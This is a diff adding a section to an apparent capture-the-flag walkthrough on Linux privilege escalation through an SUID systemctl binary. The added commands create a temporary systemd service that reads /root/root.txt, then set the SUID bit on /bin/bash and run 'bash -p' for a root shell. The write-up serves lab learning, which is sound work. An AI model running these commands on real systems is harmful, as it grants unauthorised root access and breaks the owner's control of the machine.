@@ -15,3 +15,45 @@ Escalate our privileges and become the superuser (root) :
 
     Need to find "/bin/systemctl" file
 
+
+    ->Xxploit this system further to escalate your privileges :
+    Become root and get the last flag (/root/root.txt) by using gtfobins script
+    We can find some more info on GTFObins:
+    https://gtfobins.github.io/gtfobins/systemctl/#suid
+
+    TF=$(mktemp).service
+    echo '[Service]
+    Type=oneshot
+    ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+    [Install]
+    WantedBy=multi-user.target' > $TF
+    ./systemctl link $TF
+    ./systemctl enable --now $TF
+
+
+    What we do is creating a Temporary service, which reads the root flag and outputs it to /tmp/output. 
+    This service is saved in a variable called TF. Finally, we run the service.
+    Proceed by reading the /tmp/output file and you will find the key!
+
+
+    ->How to get root : 
+    
+    The principle is basically the same. But instead of writing:
+
+    ExecStart=/bin/sh -c “cat /root/root.txt > /tmp/output on line 4 
+    
+    ->We write the following:
+
+    ExecStart=/bin/sh -c “chmod +s /bin/bash”       
+
+    Which is similar in the way that we start up a shell, but instead of outputting the flag to a text file, 
+    we instead give ourselves execute privileges on bash
+
+    ->Then We can then run bash by running:
+    
+    bash -p
+
+    The p flag means we are running it privileged.
+
+
+
